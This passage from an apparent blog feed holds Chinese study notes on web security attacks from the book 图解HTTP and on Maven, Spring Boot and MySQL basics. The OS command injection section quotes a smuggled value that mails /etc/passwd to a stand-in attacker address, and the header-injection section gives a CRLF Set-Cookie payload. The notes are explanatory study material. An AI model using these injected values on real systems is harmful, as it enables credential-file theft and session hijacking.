alt><ul><li>客户端的验证<ul><li>可以使用JS在客户端验证数据，但可能发生数据篡改数据或关闭JS，因此JS验证不适合作为安全防范对策</li><li>保留客户端验证可以尽可能早的识别出输入错误，提高UI体验</li></ul></li><li>Web应用端的验证<ul><li>输入值验证：检查是否符合系统业务逻辑的数值或检查字符编码等预防对策</li><li>输出值转义：当输出值转义出现问题，可能会触发攻击者传入的攻击代码</li></ul></li></ul></li></ul><h4 id="11.2.1-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" tabindex="-1">11.2.1 跨站脚本攻击</h4><ul><li><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript进行的一种攻击。</p></li><li><p>可能造成的影响</p><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户Cookie值，被害者不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的图片或文章</li></ul></li><li><p>跨站脚本攻击案例<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_5.jpg" alt></p></li><li><p>XSS是攻击者利用预先设置的陷阱触发的被动攻击</p></li></ul><h4 id="11.2.2-sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.2 SQL注入攻击</h4><ul><li>SQL注入是指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击。该安全隐患有可能引发极大威胁，引起机密信息丢失</li><li>SQL是用来操作关系型数据库管理系统的数据库语言</li><li><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/11_6.jpg" alt></li></ul><h4 id="11.2.3-os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.3 OS命令注入攻击</h4><ul><li>OS命令注入攻击：通过Web应用执行非法的操作系统命令达到攻击的谜底，只要在能调用shell函数的地方就有可能存在攻击</li></ul><pre><code class="language-cmd">my $adr = $q-&gt;param('mailaddress');open(MAIL, &quot;¦ /usr/sbin/sendmail $adr&quot;);print MAIL &quot;From: info@example.com\n&quot;;</code></pre><p>如果攻击者将以下值作为邮件地址</p><pre><code class="language-cmd">; cat /etc/passwd ¦ mail hack@example.jp</code></pre><p>程序接收该值，构成以下的命令组合。</p><pre><code class="language-cmd">¦ /usr/sbin/sendmail ; cat /etc/passwd ¦ mail hack@example.jp</code></pre><p>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。<br>可见，sendmail 命令执行被分隔后，接下去就会执行 cat /etc/passwd | mail <a href="mailto:hack@example.jp">hack@example.jp</a> 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 <a href="mailto:hack@example.jp">hack@example.jp</a>。</p><h4 id="11.2.4-http%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.4 HTTP首部注入攻击</h4><ul><li><p>指攻击者在响应首部字段插入换行，添加任意响应首部或主体的一种攻击，属于被动攻击。</p></li><li><p>案例：</p><ul><li>形如：Location: <a href="http://example.com/?cat=101">http://example.com/?cat=101</a></li><li>攻击者用<code>101%0D%0ASet-Cookie:+SID=123456789</code>替代101</li><li>其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（<a href="http://hackr.jp/%EF%BC%89%E7%9A%84%E4%BC%9A%E8%AF%9D">http://hackr.jp/）的会话</a> ID 设置成 SID=123456789 的Set-Cookie 首部字段</li><li>当结果返回</li></ul><pre><code>Location: http://example.com/?cat=101（%0D%0A ：换行符）Set-Cookie: SID=123456789</code></pre><ul><li>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户</li></ul></li><li><p>HTTP响应截断攻击：HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。</p></li></ul><h4 id="11.2.5-%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" tabindex="-1">11.2.5 邮件首部注入攻击</h4><p>邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。</p><h4 id="11.2.6-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB" tabindex="-1">11.2.6 目录遍历攻击</h4><p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。</p><h4 id="11.2.7-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E" tabindex="-1">11.2.7 远程文件包含漏洞</h4><p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</p><h3 id="11.3-%E5%9B%A0%E8%AE%BE%E7%BD%AE%E6%88%96%E8%AE%BE%E8%AE%A1%E4%B8%8A%E7%9A%84%E7%BC%BA%E9%99%B7%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.3 因设置或设计上的缺陷引发的安全漏洞</h3><ul><li><p>强制浏览：从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件</p><ul><li>对不公开的文件，为了安全会隐蔽其URL，但一旦知道了URL，便可以通过URL浏览对应的文件，而URL很有可能泄露<ul><li>文件目录一览</li><li>容易被推测的文件名和目录名</li><li>备份文件：备份文件无执行权限，可能以源代码形式显示</li><li>经认证才能显示的文件</li></ul></li></ul></li><li><p>不正确的错误处理</p><ul><li>与Web应用有关的错误信息<ul><li>Web应用抛出的错误信息：提示消息会暴露一些信息</li><li>数据库等系统抛出的错误信息：会给攻击者以启发</li></ul></li></ul></li><li><p>开放重定向：是一种对指定的任意 URL 作重定向跳转的功能</p><ul><li>漏洞：假如指定的重定向URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web网站</li></ul></li></ul><h3 id="11.4-%E5%9B%A0%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E8%80%8C%E7%96%8F%E5%BF%BD%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.4 因会话管理而疏忽的安全漏洞</h3><ul><li><p>会话劫持：指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p><ul><li>具备认证功能的Web应用，使用会话ID的会话管理机制。会话ID中记录客户端的Cookie信息，服务端将 会话ID与认证状态进行一对一匹配管理</li><li>可获得会话ID的途径<ul><li>通过非珍贵的生成方法推测会话ID</li><li>通过窃听或XSS攻击盗取会话ID</li><li>通过会话固定攻击（Session Fixation）强行获取会话ID</li></ul></li></ul></li><li><p>会话固定攻击：强制用户使用攻击者指定的会话ID，属于被动攻击</p></li><li><p>跨站点请求伪造：指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击</p></li></ul><h3 id="11.5-%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" tabindex="-1">11.5 其它安全漏洞</h3><ul><li><p>密码破解：密码破解攻击（Password Cracking）即算出密码，突破认证。</p><ul><li>手段<ul><li>通过网络的密码试错<ul><li>穷举法</li><li>字典攻击：收集好候选密码组成字典，枚举字典</li></ul></li><li>对已经加密的密码的破解<ul><li>通过穷举法·字典攻击进行类推</li><li>彩虹表：是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧</li><li>拿到密钥</li><li>加密算法的漏洞</li></ul></li></ul></li></ul></li><li><p>点击劫持：指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p></li><li><p>Dos攻击（Denial of Service attack）</p><ul><li>是一种让运行中的服务呈停止状态的攻击，也叫做服务停止攻击或拒绝服务攻击。</li><li>两种Dos攻击方式<ul><li>集中利用访问请求造成资源过载，资源耗尽的同时实际上服务也呈停止状态</li><li>通过攻击安全漏洞使服务停止</li></ul></li><li>多台计算机发起的Dos攻击称为DDOS（Distributed DOS）</li></ul></li><li><p>后门程序：是指开发设置的隐藏入口，可不按正常步骤使用受限功能</p><ul><li>开发阶段作为 Debug 调用的后门程序</li><li>开发者为了自身利益植入的后门程序</li><li>攻击者通过某种方法设置的后门程序</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初入后端（未完）</title>
      <link href="/2023/08/16/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/"/>
      <url>/2023/08/16/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="maven" tabindex="-1">Maven</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=50&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h3 id="01-maven%E6%A6%82%E8%BF%B0" tabindex="-1">01 Maven概述</h3><ul><li>Maven 时apache 旗下的一个开源软件，是一款用于管理和构建java项目的工具</li><li>他基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建</li><li>作用<ul><li>依赖管理：方便快件的管理项目依赖的资源(jar包)，避免版本冲突</li><li>统一项目结构：提供标准，同一的项目结构</li><li>项目构建：标准跨平台（Linux，Windows，MacOS）的自动化项目构建方式</li></ul></li><li><a href="http://maven.apache.org/">官网</a></li></ul><p><a href="/images/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/Maven%E4%BB%8B%E7%BB%8D.jpg">Maven介绍</a></p><h3 id="02-idea%E9%9B%86%E6%88%90maven" tabindex="-1">02 IDEA集成Maven</h3><ul><li><p>Maven安装：按视频走即可</p></li><li><p>根据视频进行maven的配置。</p></li><li><p>IDEA创建Maven项目</p><ul><li>创建模块，选择Maven，点击Next</li><li>填写模块名称，坐标信息，点击Finish，创建完成</li><li>编写程序运行</li></ul></li><li><p>Maven坐标</p><ul><li>什么是坐标？<ul><li>Maven中的坐标是资源的唯一标识，通过该坐标可以唯一定位资源位置</li><li>使用坐标来定义项目或引入项目中的依赖</li></ul></li><li>Maven坐标的主要组成<ul><li>groupId：定义当前Maven项目隶属组织名称（通常是域名反写）</li><li>artifactId：定义当前Maven项目名称（通常是模块名称）</li><li>version：定义当前项目版本号</li></ul></li></ul></li><li><p>IDEA导入Maven项目</p><ul><li>法一：打开IDEA，选择右侧Maven面板，点击+号，选中对应醒目的pom.xml文件，双击即可。</li><li>法二：打开IDEA中File中Project Structure -&gt; moudle -&gt; import mode 选中pom.xml文件即可</li></ul></li></ul><h3 id="03-%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86" tabindex="-1">03 依赖管理</h3><ul><li>依赖配置<ul><li>依赖：指当前项目运行所需要的jar包，一个项目中可以引入多个依赖</li><li>配置<ul><li><ol><li>在pos.xml中编写&lt;dependencies&gt;标签</li></ol></li><li><ol start="2"><li>在&lt;dependencies&gt;标签中使用&lt;dependency&gt;引入坐标</li></ol></li><li><ol start="3"><li>定义坐标的 groupId,artifactId,version</li></ol></li><li><ol start="4"><li>定义刷新按钮，引入最新加入的坐标<br><a href="http://mvnrepository.com">依赖仓库</a>,每次可以直接在这里找到所需依赖和对应坐标<br>如果引入的依赖不存在，将会连接远程仓库/中央仓库 然后下载依赖</li></ol></li></ul></li></ul></li></ul><pre><code>&lt;!-- 坐标代码示例 --&gt;&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;        &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;        &lt;version&gt;1.2.3&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><ul><li><p>依赖传递</p><ul><li>依赖具有传递性<ul><li>直接依赖：在当前项目中通过依赖配置建立的依赖关系</li><li>间接依赖：被依赖的资源如果依赖其它资源，当前项目间接依赖其它资源</li></ul></li><li>可以在maven的项目文件夹中看到依赖项，同时在xml文件中右键选择 Diagrams可以看到依赖的可视化界面</li><li>&lt;exclusions&gt;与<exclusion>可以排除指定依赖</exclusion></li></ul></li><li><p>依赖范围</p><ul><li>依赖的jar包，默认情况下，可以在任何地方使用。可以通过&lt;scope&gt;…&lt;\scope&gt;设置其作用范围：<ul><li>主程序范围有效（main文件夹范围内）</li><li>测试程序范围有效（test文件夹范围内）</li><li>是否参与打包运行（package指令范围内）</li></ul></li></ul></li></ul><table>    <tr>        <th>scope值</th>        <th>主程序</th>        <th>测试程序</th>        <th>打包（运行）</th>        <th>范例</th>    </tr>    <tr>        <td>compile（默认）</td>        <td>Y</td>        <td>Y</td>        <td>Y</td>        <td>lo4g4j</td>    </tr>    <tr>        <td>test</td>        <td>-</td>        <td>Y</td>        <td>-</td>        <td>junit</td>    </tr>    <tr>        <td>provided</td>        <td>Y</td>        <td>Y</td>        <td>-</td>        <td>servlet-api</td>    </tr>    <tr>        <td>runtime</td>        <td>-</td>        <td>Y</td>        <td>Y</td>        <td>jdbc驱动</td>    </tr></table><ul><li>生命周期<ul><li>Maven的生命周期就是为了对所有的Maven项目构建过程进行抽象和统一</li><li>Maven中有三套相互独立的生命周期<ul><li>clean：清理工作</li><li>default：核心工作，如：编译，测试，打包，安装，部署等</li><li>site：生成报告，发布站点</li><li>在同一个生命周期中，当运行后面的阶段时，前面的阶段都会运行</li></ul></li><li>重点掌握5个<ul><li>clean：移除上一次构建生成的文件</li><li>compile：编译项目源代码</li><li>test：使用合适的单元测试框架运行测试（junt）</li><li>package：将编译后的文件打包，如：jar，war</li><li>install：安装项目到本地仓库</li></ul></li><li>执行生命周期的两种方式：<ul><li>在idea中，右侧的maven工具栏，选中对应的生命周期，双击执行</li><li>在命令行中，通过命令执行</li></ul></li></ul></li></ul><h2 id="web-%E5%85%A5%E9%97%A8" tabindex="-1">Web 入门</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=58&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h3 id="01-springbootweb%E5%85%A5%E9%97%A8" tabindex="-1">01 SpringBootWeb入门</h3><ul><li>需求:<ul><li>使用springboot开发一个web应用，浏览器发起/hello后，给浏览器返回字符串“hello world”</li><li>步骤：<ul><li><ol><li>创建springboot工程，并勾选web开发相关依赖</li></ol></li><li><ol start="2"><li>定义helloController类，添加方法hello，并添加注解</li></ol></li><li><ol start="3"><li>运行测试</li></ol></li></ul></li></ul></li></ul><h3 id="02-http%E5%8D%8F%E8%AE%AE" tabindex="-1">02 HTTP协议</h3><ul><li>HTTP概述<ul><li>概念：Hyper Text Transfer Protocol 超文本传输协议，规定了浏览器和服务器之间的数据传输</li><li>特点：<ul><li><ol><li>基于TCP协议：面向连接，安全</li></ol></li><li><ol start="2"><li>基于请求-响应模型：一次请求对应一次响应</li></ol></li><li><ol start="3"><li>HTTP协议是无状态的协议：对于事务处理没有记忆能力，每次请求和响应都是独立的</li></ol><ul><li>缺点：多次请求之间不能共享数据（可以克服）</li><li>优点：速度快</li></ul></li></ul></li></ul></li><li>HTTP请求协议<ul><li>请求数据格式<ul><li>请求行：请求数据的第一行（请求方式，资源路径，协议）</li><li>请求头：从第二行开始，格式key：value</li><li>请求体：POST请求，存放请求参数<ul><li>请求方式GET：请求参数在请求行中，没有请求体，GET请求大小是有限的</li><li>请求方式POST:请求参数在请求体中，POST请求大小是没有限制的</li></ul></li></ul></li></ul></li><li>HTTP响应协议<ul><li>响应数据格式<ul><li>响应行：响应数据的第一行（协议，状态码，描述）<br>状态码大类</li><li>响应头：第二行开始，格式key：value</li><li>响应体：最后一部分，存放响应数据</li></ul></li></ul></li></ul><table><thead><tr><th>状态码分类</th><th>说明</th></tr></thead><tbody><tr><td>1xx</td><td>响应中–临时状态码，标识请求已经接受，告诉客户端应该继续请求或者如果已完成则忽略</td></tr><tr><td>2xx</td><td>成功–标识请求已经成功被接受，处理已经完成</td></tr><tr><td>3xx</td><td>重定向–重定向到其他地方：他让客户端再发起一个请求以完成整个处理</td></tr><tr><td>4xx</td><td>客户端错误–处理发生错误，责任在客户端，如：客户端请求一个不存在的资源，客户端未被授权，禁止访问等</td></tr><tr><td>5xx</td><td>服务器端错误–处理发生错误，责任在服务端，如：服务端抛出异常，路由错误，HTTP版本不支持等</td></tr></tbody></table><ul><li>HTTP协议解析<ul><li>HTTP协议解析代码将会很复杂，但因为HTTP的广泛使用，且协议的标准型，已经有公司提供出专用的web服务器软件，Tomcat便是一种</li></ul></li></ul><h3 id="03-web%E6%9C%8D%E5%8A%A1%E5%99%A8-tomcat" tabindex="-1">03 Web服务器-Tomcat</h3><p>Web服务器是一个软件程序，对HTTP协议的操作进行封装，使得程序员不必直接对协议操作，让web开发更加便捷。主要功能是“提供网上信息浏览服务”</p><ul><li>简介<ul><li>概念：Tomcat是Apache软件基金会的一个核心项目，是一个开源免费的轻量级Web服务器，支持Servlet/JSP少量JavaEE规范</li><li>JavaEE：Java Enterprise Edition，Java企业版。指Java企业级开发的技术规范的总和</li><li>JavaSE：Java标准版 JavaME：java小型版，多用于嵌入式</li><li>Tomcat也被称为Web容器，Servlet容器。Servlet程序需要依赖于Tomcat才能运行</li><li><a href="https://tomcat.apache.org">官网</a></li></ul></li><li>基本使用:发现本地使用不了，寄</li><li>入门程序解析：<ul><li>起步依赖,原理是maven依赖传递<ul><li>spring-boot-stater-web</li><li>spring-boot-stater-test</li></ul></li><li>内嵌tomcat服务器：springboot自带tomcat作为服务器，tomcat白雪，不用运行</li></ul></li></ul><h2 id="%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94" tabindex="-1">请求响应</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=67&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频连接</a></p><ul><li>前端控制器 DispatchServlet，提供了两个对象<ul><li>请求对象 HttpServletRequest : 获取请求程序</li><li>响应对象 HttpServletResponse : 设置响应数据</li></ul></li><li>BS架构： Browser/Server，浏览器/服务器架构。客户端只需要浏览器，应用程序和逻辑都存储在服务器端(维护方便，体验一般)</li><li>CS架构： Client/Server，客户端/服务器模式 （开发，维护麻烦，但体验不错）</li></ul><h3 id="01-%E8%AF%B7%E6%B1%82" tabindex="-1">01 请求</h3><ul><li><p>当前最主流开发模式：前后端分离，原型+需求决定接口文档，前后端依据接口文档进行开发</p></li><li><p>postman的使用：</p><ul><li>postman是一款功能强大的网页调试与发送网页http请求的chrome插件，常用于接口测试</li></ul></li><li><p>简单参数</p><ul><li>原始方式：在原始的web程序中，获取请求参数，需要通过HttpServletRequest对象手动获取。但这种方法繁琐，需要手动转换类型</li></ul><pre><code class="language-java">@RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(HttpServletRequest request)&#123;      String name=request.getParameter(&quot;name&quot;);      String ageStr=request.getParameter(&quot;age&quot;);      int age = Integer.parseInt(ageStr);      System.out.println(name+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre><ul><li>springboot方式：只要参数名和形参变量名相同，定义形参即可接受参数</li></ul><pre><code class="language-java">@RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(String name,Integer age)&#123;      System.out.println(name+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre><ul><li>springboot方式中，如果方法形参名称与请求参数名称不匹配，可以使用<code>@RequestParam</code>进行映射。<ul><li><code>@RequestParam</code>中的<code>required</code>属性值默认为true，代表该参数必须传递，不传递将会报错。如果该参数是可选的，可以将<code>required</code>值设置为false</li></ul></li></ul><pre><code class="language-java">  @RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(@RequestParam(name=&quot;name&quot;) String username, Integer age)&#123;      System.out.println(username+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>实体参数</p><ul><li>简单实体参数：请求参数名和形参对象属性名相同，定义POJO接受即可</li><li>复杂实体参数：即实体的嵌套，请求参数名和形参对象属性名相同，按照对象层次结构关系即可接受嵌套POJO属性参数</li></ul><pre><code class="language-java">//http://localhost:8080/simplePojo?name=Tom&amp;age=10&amp;address.province=陕西&amp;address.city=西安public class User &#123;  private String name;  private Integer age;  private address Address;&#125;public class address &#123;  private String province;  private String city;&#125;</code></pre></li><li><p>数组集合参数</p><ul><li>数组参数：请求参数名与形参数组名称相同且请求参数为多个，定义数组类型形参即可接受参数</li></ul><pre><code class="language-java">//http://localhost:8080/arrayParam?hobby=game&amp;hobby=java&amp;hobby=sing@RequestMapping(&quot;/arrayParam&quot;)  public String arrayParam(String[] hobby)&#123;      System.out.println(Arrays.toString(hobby));      return &quot;OK&quot;;  &#125;</code></pre><ul><li>集合参数：请求参数名与形参数组名称相同，通过@RequestParam绑定参数关系</li></ul><pre><code class="language-java">//http://localhost:8080/listParam?hobby=game&amp;hobby=java&amp;hobby=sing@RequestMapping(&quot;/listParam&quot;)  public String arrayParam(@RequestParam List&lt;String&gt; hobby)&#123;      System.out.println(hobby);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>日期参数：</p><ul><li>使用<code>@DateTimeFormat</code>注解完成日期参数格式转换</li></ul><pre><code class="language-java">  //http://localhost:8080/dateParam?updateTime=2023-03-25 15:40:00  @RequestMapping(&quot;/dateParam&quot;)  public String dataParam(@DateTimeFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)LocalDateTime updateTime)&#123;      System.out.println(updateTime);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>JSON参数</p><ul><li>json数据键名与形参对象属性名相同，定义POJO类型形参即可接收参数，需要使用<code>RequestBody</code>标识</li></ul><pre><code class="language-java">//http://localhost:8080/jsonParam@RequestMapping(&quot;/jsonParam&quot;)  public String jsonParam(@RequestBody User user)&#123;      System.out.println(user);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>路径参数</p><ul><li>通过请求url直接传递参数，使用{…}来标识路径参数，需要使用<code>@PathVariable</code>获取路径参数</li></ul><pre><code class="language-java">//http://localhost:8080/path/10@RequestMapping(&quot;/path/&#123;id&#125;&quot;)  public String pathParam(@PathVariable Integer id)&#123;      System.out.println(id);      return &quot;OK&quot;;  &#125;//传递两个参数//http://localhost:8080/path/10/Tom@RequestMapping(&quot;/path/&#123;id&#125;/&#123;name&#125;&quot;)  public String path2Param(@PathVariable Integer id,@PathVariable String name)&#123;      System.out.println(id+&quot;:&quot;+name);      return &quot;OK&quot;;  &#125;</code></pre></li></ul><h3 id="02-%E5%93%8D%E5%BA%94" tabindex="-1">02 响应</h3><ul><li>响应数据使用<code>@ResponseBody</code>注解<ul><li>类型：方法注解，类注解</li><li>位置：Controller方法/类上</li><li>作用：将方法返回值直接响应，如果返回值类型是实体对象/集合，将会转换为JSON格式</li><li>说明：<code>@RestController=@Controller+@ResponseBody</code></li></ul></li><li>使用同一响应结果，方便项目管理和维护，如设置一个result类，所有返回结果均为result类</li><li><code>Result(code,msg,data)</code></li></ul><h3 id="03-%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90" tabindex="-1">03 请求和响应综合案例分析</h3><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=74&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频连接</a></p><p>前端和后端的组合小案例</p><h3 id="04-%E5%88%86%E5%B1%82%E8%A7%A3%E8%80%A6" tabindex="-1">04 分层解耦</h3><ul><li><p>三层架构</p><ul><li>controller:控制层，接收前端发送的请求，对请求进行处理，并响应数据</li><li>service：业务逻辑层，处理具体的业务逻辑</li><li>dao：数据访问层（Data Access Object）（持久层），负责数据访问操作，包括数据的增删改查</li><li>三层架构 复用性强，便于维护，利于拓展</li></ul></li><li><p>分层解耦</p><ul><li>内聚：软件中各个功能模块内部的功能联系</li><li>耦合：衡量软件中各个层/模块之间的依赖和关联程度</li><li>软件设计原则：高内聚低耦合</li><li></li></ul></li><li><p>IoC (Inversion of Control) 控制反转</p><ul><li>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对像创建控制权由程序转移到外部，此思想称为控制反转</li><li>Spring技术对IoC技术进行了实现<ul><li>Spring提供了一个容器，称为IoC容器，用来充当IoC思想中的“外部”</li><li>IoC容器负责对象的创建，初始化等一系列工作，被创建或被管理的对象再IoC容器里称为<code>Bean</code></li></ul></li></ul></li><li><p>DI (Dependency Injection) 依赖注入</p><ul><li>在容器中简历bean和bean之间的依赖关系的整个过程，称为依赖注入</li></ul></li><li><p>IOC与DI入门程序</p><ul><li>在类前加<code>@Component</code>表示将当前类交给IOC容器管理，称为IOC容器里的bean。该操作实现控制反转</li><li>在对象前加<code>@Autowired</code>表示在运行时，IOC容器会提供该类型的bean对象，并赋值给该变量。该操作实现依赖注入。</li></ul></li><li><p>IOC详解</p><ul><li>Bean的声明：要把某个对象交给IOC容器管理，需要在对应的类上加上如下注解之一：</li></ul><table><thead><tr><th>注解</th><th>说明</th><th>位置</th></tr></thead><tbody><tr><td>@Component</td><td>声明bean的基础解释</td><td>不属于以下三类时，用此注解</td></tr><tr><td>@Controller</td><td>@Component的衍生注解</td><td>标注在控制器类上</td></tr><tr><td>@Service</td><td>@Component的衍生注解</td><td>标注在业务类上</td></tr><tr><td>@Repository</td><td>@Component的衍生注解</td><td>标注在数据访问类上（由于与mybatis整合，用的很少）</td></tr></tbody></table><ul><li>注意事项：<ul><li>声明bean时，可以通过value属性指定bean的名字，如果没有指定，默认为类名首字母小写</li><li>使用以上四个注解都可以声明bean，但是在springboot集成web开发中，声明控制器bean只能用<code>@Controller</code></li></ul></li><li>Bean的组件扫描<ul><li>前面声明的bean的四大注解，想要生效，还需要被组件扫描注解<code>@ComponentScan</code>扫描</li><li><code>@ComponentScan</code>注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解<code>@SpringBootApplication</code>中，默认扫描范围时启动类所在包及其子包</li><li>可以手动设置扫描范围以覆盖默认扫描范围，但推荐还是把项目中的所有bean都放在启动类中</li></ul></li></ul></li><li><p>DI详解</p><ul><li><code>@Autowired</code>：默认安装类型自动装配</li><li>如果同类型的bean存在多个<ul><li><code>@Primary</code>：放到bean的注解前，用来指定优先级</li><li><code>@AutoWired+@qualifier(&quot;bean的名称&quot;)</code>根据名称选择</li><li><code>@Resource(name=&quot;bean的名称&quot;)</code>根据名称选择</li></ul></li><li><code>@AutoWired</code>和<code>@Resource</code>的区别<ul><li><code>@Resource</code>是JDK提供的注解,<code>@AutoWired</code>是spring框架提供的注解</li><li><code>@AutoWired</code>默认按照类型进行注入,<code>@Resource</code>默认按照名称进行注入</li></ul></li></ul></li></ul><h2 id="mysql" tabindex="-1">MySQL</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=80&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><p>以下内容可分为三个部分</p><ul><li>数据库设计<ul><li>MySQL概述</li><li>数据库设计-DDL</li><li>多表设计</li></ul></li><li>数据库操作<ul><li>数据库操作-DML</li><li>数据库操作-DQL</li><li>事务</li><li>查询</li></ul></li><li>数据库优化<ul><li>索引</li><li>SQL优化</li></ul></li></ul><h3 id="01-mysql%E6%A6%82%E8%BF%B0" tabindex="-1">01 MySQL概述</h3><ul><li><p>安装社区版MySQL，<a href="https://dev.mysql.com/downloads/mysql/">官网</a><br>安装步骤视频讲的很细</p></li><li><p>MySQL连接：<code>mysql -u用户名 -p 密码 [-h数据库服务器IP地址 -P端口号]</code></p></li><li><p>MySQL-企业开发使用方式</p><ul><li>远程使用服务器</li></ul></li><li><p>MySQL数据库模型</p><ul><li>关系型数据库（RDBMS）：建立在关系模型基础上，由多张相互连接的二维表组成的数据库</li><li>特点：<ul><li>使用表存储数据，格式统一，便于维护</li><li>使用SQL语言操作，标准统一，使用方便，可用于复杂查询</li></ul></li></ul></li><li><p>SQL简介</p><ul><li>SQL：一门操作关系型数据库的编程语言，定义操作所有关系型数据库的统一标准</li><li>通用语法：<ul><li>SQL语句可以单行或者多行书写，以分号结尾</li><li>SQL语句可以使用空格或缩进来增强语句可读性</li><li>MYSQL数据库的SQL语句不区分大小写</li><li>注释<ul><li><ol><li>单行注释：<code>-- 注释内容</code> 或 <code># 注释内容</code>(MySQL特有)</li></ol></li><li><ol start="2"><li>多行注释：<code>/*注释内容*/</code></li></ol></li></ul></li></ul></li><li>SQL分类<ul><li>SQL语句通常分为四类</li></ul></li></ul><table><thead><tr><th>分类</th><th>全称</th><th>说明</th></tr></thead><tbody><tr><td>DDL</td><td>Data Definition 